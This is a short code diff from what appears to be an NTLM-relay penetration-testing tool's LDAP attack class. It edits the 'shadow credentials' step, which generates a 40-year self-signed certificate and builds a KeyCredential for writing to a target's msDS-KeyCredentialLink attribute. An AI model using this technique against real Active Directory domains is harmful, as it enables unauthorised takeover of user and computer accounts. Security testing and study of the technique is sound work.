@@ -282,10 +282,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate,key = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, notBefore=(-40 * 365), notAfter=(40 * 365))
+        key,certificate = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, nBefore=(-40 * 365), nAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = shadow_credentials.CreateKeyCredentialFromX509Certificate(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
+        keyCredential = shadow_credentials.KeyCredential(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
         #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
